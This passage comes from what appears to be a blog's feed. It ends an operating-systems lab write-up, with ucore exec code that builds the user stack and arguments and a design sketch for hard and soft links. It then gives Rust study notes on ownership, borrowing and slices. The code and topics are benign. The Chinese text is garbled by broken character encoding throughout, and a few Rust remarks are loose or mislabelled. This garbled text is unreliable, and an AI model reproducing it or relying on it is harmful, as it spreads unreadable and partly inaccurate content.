ˆå†…å­˜</span><br>    vm_flags = VM_READ | VM_WRITE | VM_STACK;<br>    <span class="hljs-keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>    &#125;<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-2</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-3</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-4</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br><br>    mm_count_inc(mm);<br>    <span class="hljs-comment">// è®¾ç½®CR3é¡µè¡¨ç›¸å…³å¯„å­˜å™¨</span><br>    current-&gt;mm = mm;<br>    current-&gt;cr3 = PADDR(mm-&gt;pgdir);<br>    lcr3(PADDR(mm-&gt;pgdir));<br><br>    <span class="hljs-comment">//setup argc, argv</span><br>    <span class="hljs-comment">// LAB8 è®¾ç½®execveæ‰€å¯åŠ¨çš„ç¨‹åºå‚æ•°</span><br>    <span class="hljs-keyword">uint32_t</span> argv_size=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>)+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>);<br>    <span class="hljs-comment">// ç›´æ¥å°†ä¼ å…¥çš„å‚æ•°å‹å…¥è‡³æ–°æ ˆçš„åº•éƒ¨</span><br>    <span class="hljs-keyword">char</span>** uargv=(<span class="hljs-keyword">char</span> **)(stacktop  - argc * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));<br><br>    argv_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        uargv[i] = <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)(stacktop + argv_size ), kargv[i]);<br>        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    stacktop = (<span class="hljs-keyword">uintptr_t</span>)uargv - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>    *(<span class="hljs-keyword">int</span> *)stacktop = argc;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf-&gt;tf_cs = USER_CS;<br>    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;<br>    tf-&gt;tf_esp = stacktop;<br>    tf-&gt;tf_eip = elf-&gt;e_entry;<br>    tf-&gt;tf_eflags = FL_IF;<br>    ret = <span class="hljs-number">0</span>;<br>out:<br>    <span class="hljs-keyword">return</span> ret;<br>bad_cleanup_mmap:<br>    exit_mmap(mm);<br>bad_elf_cleanup_pgdir:<br>    put_pgdir(mm);<br>bad_pgdir_cleanup_mm:<br>    mm_destroy(mm);<br>bad_mm:<br>    <span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>ç»™å‡ºè®¾è®¡å®ç°åŸºäºâ€<strong>UNIXçš„ç¡¬é“¾æ¥å’Œè½¯é“¾æ¥æœºåˆ¶</strong>â€œçš„æ¦‚è¦è®¾è®¡æ–¹æ¡ˆ</p></blockquote><ul><li><p>SFSä¸­å·²ç»é¢„ç•™å‡ºç¡¬é“¾æ¥/è½¯é“¾æ¥çš„ç›¸å…³å®šä¹‰ï¼ˆæ²¡æœ‰å®ç°ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * VFS layer high-level operations on pathnames</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    vfs_link         - Create a hard link to a file.</span><br><span class="hljs-comment"> *    vfs_symlink      - Create a symlink PATH containing contents CONTENTS.</span><br><span class="hljs-comment"> *    vfs_unlink       - Delete a file/directory.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_link</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_symlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_unlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path)</span></span>;<br></code></pre></div></td></tr></table></figure></li><li><p>ç¡¬é“¾æ¥æœºåˆ¶çš„å®ç°</p><ul><li>åˆ›å»ºç¡¬é“¾æ¥æ—¶ï¼Œä»ç„¶ä¸º<code>new_path</code>å»ºç«‹ä¸€ä¸ª<code>sfs_disk_entry</code>ç»“æ„ï¼Œä½†è¯¥ç»“æ„çš„å†…éƒ¨<code>ino</code>æˆå‘˜æŒ‡å‘<code>old_path</code>çš„ç£ç›˜ç´¢å¼•ç»“ç‚¹ï¼Œå¹¶ä½¿è¯¥ç£ç›˜ç´¢å¼•èŠ‚ç‚¹çš„<code>nlinks</code>å¼•ç”¨è®¡æ•°æˆå‘˜åŠ ä¸€å³å¯ã€‚</li><li>åˆ é™¤ç¡¬é“¾æ¥æ—¶ï¼Œä»¤å¯¹åº”ç£ç›˜ç»“ç‚¹<code>sfs_disk_inode</code>ä¸­çš„<code>nlinks</code>å‡ä¸€ï¼ŒåŒæ—¶åˆ é™¤ç¡¬é“¾æ¥çš„<code>sfs_disk_entry</code>ç»“æ„å³å¯ã€‚</li></ul></li><li><p>è½¯é“¾æ¥çš„å®ç°</p><ul><li>ä¸åˆ›å»ºç¡¬é“¾æ¥ä¸åŒï¼Œåˆ›å»ºè½¯é“¾æ¥æ—¶è¦å¤šå»ºç«‹ä¸€ä¸ª<code>sfs_disk_inode</code>ç»“æ„ï¼ˆå³å»ºç«‹ä¸€ä¸ªå…¨æ–°çš„æ–‡ä»¶ï¼‰ã€‚ä¹‹åï¼Œå°†<code>old_path</code>å†™å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œå¹¶æ ‡æ³¨<code>sfs_disk_inode</code>çš„<code>type</code>ä¸º<code>SFS_TYPE_LINK</code>å³å¯ã€‚</li><li>åˆ é™¤è½¯é“¾æ¥ä¸åˆ é™¤æ–‡ä»¶çš„æ“ä½œæ²¡æœ‰åŒºåˆ«ï¼Œç›´æ¥å°†å¯¹åº”çš„<code>sfs_disk_entry</code>å’Œ<code>sfs_disk_inode</code>ç»“æ„åˆ é™¤å³å¯ã€‚</li></ul></li></ul><ul><li>moocosçš„å¯†ç æ˜¯ç©ºæ ¼<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>å³åŸå…ˆæŸ¥æ‰¾é¡µç›®å½•è¡¨çš„ç›®çš„æ˜¯æƒ³å°†æŸä¸ªçº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œä½†å¦‚æœé¡µç›®å½•è¡¨ä¸­å­˜æ”¾çš„æ˜¯äºŒçº§é¡µè¡¨çš„<strong>çº¿æ€§</strong>åœ°å€ï¼Œåˆ™éœ€è¦å…ˆæŸ¥æ‰¾è¯¥äºŒçº§é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œæ­¤æ—¶éœ€è¦é€’å½’æŸ¥æ‰¾ï¼Œè¿™å¯èƒ½ä¼šå‡ºç°æ°¸è¿œä¹ŸæŸ¥æ‰¾ä¸åˆ°ç‰©ç†åœ°å€çš„æƒ…å†µã€‚<a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Specialty in Rust</title>
    <link href="/2021-09/Archive-Specialty-in-Rust/"/>
    <url>/2021-09/Archive-Specialty-in-Rust/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kaisery.github.io/trpl-zh-cn">ã€ŠRust ç¨‹åºè®¾è®¡è¯­è¨€ã€‹</a> + <a href="https://course.rs/about-book.html">Rustè¯­è¨€åœ£ç»(Rust Course)</a> </p><h1 id="Rust-Course"><a href="#Rust-Course" class="headerlink" title="Rust Course"></a>Rust Course</h1><ul><li>ä½¿ç”¨ä¸‹åˆ’çº¿å¼€å¤´å¿½ç•¥æœªä½¿ç”¨çš„å˜é‡, ä»¥é¿å…è­¦å‘Š.</li><li><strong>å˜é‡é®è”½</strong>æŒ‡åé®è”½å‰å˜é‡å£°æ˜ï¼Œå¦‚æœä½ åœ¨æŸä¸ªä½œç”¨åŸŸå†…æ— éœ€å†ä½¿ç”¨ä¹‹å‰çš„å˜é‡ï¼ˆåœ¨è¢«é®è”½åï¼Œæ— æ³•å†è®¿é—®åˆ°ä¹‹å‰çš„åŒåå˜é‡ï¼‰ï¼Œå°±å¯ä»¥é‡å¤çš„ä½¿ç”¨å˜é‡åå­—ï¼Œè€Œä¸ç”¨ç»å°½è„‘æ±å»æƒ³æ›´å¤šçš„åå­—ã€‚</li><li>Rust æ˜¯ä¸€é—¨é™æ€ç±»å‹è¯­è¨€, ä½†æ˜¯ç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨æ¨å¯¼å˜é‡ç±»å‹.</li><li><code>1..5</code>ï¼Œç”Ÿæˆä» 1 åˆ° 4 çš„è¿ç»­æ•°å­—ï¼Œä¸åŒ…å« 5 ï¼›<code>1..=5</code>ï¼Œç”Ÿæˆä» 1 åˆ° 5 çš„è¿ç»­æ•°å­—ï¼ŒåŒ…å« 5</li><li>Rust æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œå› æ­¤éœ€è¦ä½ ä¸ºæ¯ä¸€ä¸ªå‡½æ•°å‚æ•°éƒ½æ ‡è¯†å‡ºå®ƒçš„å…·ä½“ç±»å‹</li><li>åœ¨æ–°çš„ç¼–è¯‘å™¨ä¸­, <strong>å¼•ç”¨ä½œç”¨åŸŸçš„ç»“æŸä½ç½®ä»èŠ±æ‹¬å·å˜æˆæœ€åä¸€æ¬¡ä½¿ç”¨çš„ä½ç½®</strong>.</li><li></li></ul><h1 id="commandline"><a href="#commandline" class="headerlink" title="commandline"></a>commandline</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">cargo doc <br>cargo doc --open<br>rustc --explain (something)<br></code></pre></div></td></tr></table></figure><h1 id="common-concepts"><a href="#common-concepts" class="headerlink" title="common concepts"></a>common concepts</h1><h2 id="code-example"><a href="#code-example" class="headerlink" title="code example"></a>code example</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::cmp::Ordering;<br><span class="hljs-keyword">use</span> std::io;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Guess the number!&quot;</span>);<br><br>    <span class="hljs-keyword">let</span> secret_number = rand::thread_rng().gen_range(<span class="hljs-number">1</span>..<span class="hljs-number">101</span>);<br><br>    <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Please input your guess.&quot;</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> guess = <span class="hljs-built_in">String</span>::new();<br>        io::stdin()<br>            .read_line(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .expect(<span class="hljs-string">&quot;Failed to read line&quot;</span>);<br>        <span class="hljs-keyword">let</span> guess: <span class="hljs-built_in">u32</span> = <span class="hljs-keyword">match</span> guess.trim().parse() &#123;<br>            <span class="hljs-literal">Ok</span>(num) =&gt; num,<br>            <span class="hljs-literal">Err</span>(_) =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br><br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);<br><br>        <span class="hljs-keyword">match</span> guess.cmp(&amp;secret_number) &#123;<br>            Ordering::Less =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too small!&quot;</span>),<br>            Ordering::Greater =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too big!&quot;</span>),<br>            Ordering::Equal =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>cargo doc --open</code> doc is stored in the folder.</li><li>something special in enumeration waiting for me to be explored </li><li>Rust <strong>doesnâ€™t care where you define your functions, only that theyâ€™re defined somewhere.</strong>  </li><li>Statements do not return values. Therefore, you canâ€™t assign a <code>let</code> statement to another variable, and canâ€™t use x=y=6 to have both x and y have the value 6</li><li>Rust will do check of every <strong>array indexing operation</strong>, thus will run slowly</li></ul><h2 id="about-return-statement"><a href="#about-return-statement" class="headerlink" title="about return statement"></a>about return statement</h2><ul><li>Block is expression, expressions do not include ending semicolons. Most functions return the last <strong>expression</strong> implicitly. Assigning a block of statements to a variable will get an empty tuple, expressed by â€œ()â€.</li></ul><h2 id="if-expressions"><a href="#if-expressions" class="headerlink" title="if expressions"></a>if <strong><code>expressions</code></strong></h2><ul><li>no parentheses in <code>return</code> and <code>if</code> keyword, Blocks of code associated with the conditions in <code>if</code> expressions are sometimes called <em><strong>arms</strong></em> </li><li>Rust will not automatically try to convert non-Boolean types to a Boolean, do not use integer as the condition of <code>if</code>, instead using an integer greater or less than or equal to an certain number. </li><li>if else if else if â€¦â€¦ may be changed to <code>match</code>  </li><li><code>let number = if condition &#123; 5 &#125; else &#123; 6 &#125;;</code> donâ€™t use different types in each <strong>arms</strong>.</li></ul><h2 id="Repeating"><a href="#Repeating" class="headerlink" title="Repeating"></a>Repeating</h2><ul><li><strong><code>loop</code></strong>(use <code>break</code> and <code>^C</code> to terminate)  , <code>while</code>, and <code>for</code> </li><li><code>break</code> can <strong>take a value</strong> as the return of the <code>loop</code> </li><li>use <code>for element in a.iter()</code> to speed up array indexing </li><li><code>for</code> : <code>for number in (1..4).rev()</code> </li></ul><h1 id="ownership"><a href="#ownership" class="headerlink" title="ownership"></a>ownership</h1><blockquote><p>Ownership is Rustâ€™s most unique feature, and it enables Rust to make memory safety guarantees without needing a garbage collector.    </p><p>Memory Management: Memory is managed through a system of ownership with a set of rules that the compiler checks at <strong>compile time</strong>, wonâ€™t slow down your program.</p></blockquote><h2 id="ownership-rules"><a href="#ownership-rules" class="headerlink" title="ownership rules:"></a>ownership rules:</h2><blockquote><ol><li>Each value in Rust has a variable thatâ€™s called its <em>owner</em>.</li><li>There can only be one owner at a time.</li><li>When the owner goes out of scope, the value will be dropped.</li></ol></blockquote><ul><li><p><strong>immutable</strong> string literals and the <strong>changeable</strong> String type </p></li><li><p>create a <code>String</code> from a string literal using the <code>from</code> function: <code>let s = String::from(&quot;hello&quot;);</code> </p></li><li><p>Rust takes a different path from those languages having GC: the memory is <u>automatically returned</u> once the variable that owns it goes out of scope.</p></li><li><p>Rust calls a special function for us. This function is called <a href="https://doc.rust-lang.org/std/ops/trait.Drop.html#tymethod.drop"><code>drop</code></a>, and itâ€™s where the author of <code>String</code> can put the code to return the memory. Rust calls <code>drop</code> automatically at the closing curly bracket.</p></li><li><p>the following code will lead to a move instead of a shallow or deep copy, or you can use <code>s1.clone()</code> to do deep copy</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = s1;<br></code></pre></div></td></tr></table></figure></li><li><p>there is <code>copy</code> and <code>drop</code> trait, which wonâ€™t coexist, the former will leave old value as valid.</p></li><li><p><strong>Ownership and Functions</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">// s comes into scope</span><br><br>    takes_ownership(s);             <span class="hljs-comment">// s&#x27;s value moves into the function...</span><br>                                    <span class="hljs-comment">// ... and so is no longer valid here</span><br><br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">5</span>;                      <span class="hljs-comment">// x comes into scope</span><br><br>    makes_copy(x);                  <span class="hljs-comment">// x would move into the function,</span><br>                                    <span class="hljs-comment">// but i32 is Copy, so it&#x27;s okay to still</span><br>                                    <span class="hljs-comment">// use x afterward</span><br><br>&#125; <span class="hljs-comment">// Here, x goes out of scope, then s. But because s&#x27;s value was moved, nothing</span><br>  <span class="hljs-comment">// special happens.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_ownership</span></span>(some_string: <span class="hljs-built_in">String</span>) &#123; <span class="hljs-comment">// some_string comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_string);<br>&#125; <span class="hljs-comment">// Here, some_string goes out of scope and `drop` is called. The backing</span><br>  <span class="hljs-comment">// memory is freed.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">makes_copy</span></span>(some_integer: <span class="hljs-built_in">i32</span>) &#123; <span class="hljs-comment">// some_integer comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_integer);<br>&#125; <span class="hljs-comment">// Here, some_integer goes out of scope. Nothing special happens.</span><br></code></pre></div></td></tr></table></figure></li><li><p><strong>Return Values and Scope</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = gives_ownership();         <span class="hljs-comment">// gives_ownership moves its return</span><br>                                        <span class="hljs-comment">// value into s1</span><br><br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);     <span class="hljs-comment">// s2 comes into scope</span><br><br>    <span class="hljs-keyword">let</span> s3 = takes_and_gives_back(s2);  <span class="hljs-comment">// s2 is moved into</span><br>                                        <span class="hljs-comment">// takes_and_gives_back, which also</span><br>                                        <span class="hljs-comment">// moves its return value into s3</span><br>&#125; <span class="hljs-comment">// Here, s3 goes out of scope and is dropped. s2 goes out of scope but was</span><br>  <span class="hljs-comment">// moved, so nothing happens. s1 goes out of scope and is dropped.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">gives_ownership</span></span>() -&gt; <span class="hljs-built_in">String</span> &#123;             <span class="hljs-comment">// gives_ownership will move its</span><br>                                             <span class="hljs-comment">// return value into the function</span><br>                                             <span class="hljs-comment">// that calls it</span><br><br>    <span class="hljs-keyword">let</span> some_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// some_string comes into scope</span><br><br>    some_string                              <span class="hljs-comment">// some_string is returned and</span><br>                                             <span class="hljs-comment">// moves out to the calling</span><br>                                             <span class="hljs-comment">// function</span><br>&#125;<br><br><span class="hljs-comment">// takes_and_gives_back will take a String and return one</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_and_gives_back</span></span>(a_string: <span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">String</span> &#123; <span class="hljs-comment">// a_string comes into</span><br>                                                      <span class="hljs-comment">// scope</span><br><br>    a_string  <span class="hljs-comment">// a_string is returned and moves out to the calling function</span><br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h2 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h2><ul><li>we call having references as function parameters <em>borrowing</em> </li><li>Referenceâ€™s <strong>default  immutable</strong>  </li><li><strong>Use mutabel parameter:</strong> <ol><li>First, we had to change <strong>variable</strong> <code>s</code> to be <code>mut</code>. </li><li>Then we had to create a mutable reference with <code>&amp;mut s</code> </li><li>and accept a mutable reference in the function with <code>some_string: &amp;mut String</code>.</li></ol></li><li><strong>you can have only one mutable reference to a particular piece of data in a particular scope(avoiding <em>race</em>)</strong></li></ul><blockquote><p>A <em><strong>data race</strong></em> is similar to a race condition and happens when these three behaviors occur:</p><ul><li>Two or more pointers access the same data at the same time.</li><li>At least one of the pointers is being used to write to the data.</li><li>Thereâ€™s no mechanism being used to synchronize access to the data.</li></ul><p>The Rust prevents it by giving out an error.</p></blockquote><ul><li>E0502: A variable already borrowed as immutable was borrowed as mutable. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// a is borrowed as immutable.</span><br>    bar(a);     <span class="hljs-comment">// as immutable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>To fix this error, ensure that you donâ€™t have any other references to the variable before trying to access it mutably:   </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    bar(a);<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// ok!</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y); <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="The-slice-type"><a href="#The-slice-type" class="headerlink" title="The slice type"></a>The slice type</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">usize</span> &#123;<br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br><br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123; <br><span class="hljs-comment">//iter is a method that returns each element in a collection and that enumerate wraps the result of iter </span><br>    <span class="hljs-comment">//and returns each element as part of a tuple instead.(first index, second the reference)</span><br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    s.len()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    <span class="hljs-keyword">let</span> word = first_word(&amp;s); <span class="hljs-comment">// word will get the value 5</span><br>    s.clear(); <span class="hljs-comment">// this empties the String, making it equal to &quot;&quot;</span><br>    <span class="hljs-comment">// word still has the value 5 here, but there&#x27;s no more string that</span><br>    <span class="hljs-comment">// we could meaningfully use the value 5 with. word is now totally invalid!</span><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>return a <em>string slice</em> instead of an index </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;<span class="hljs-comment">//The type that signifies â€œstring sliceâ€ is written as &amp;str</span><br>    <span 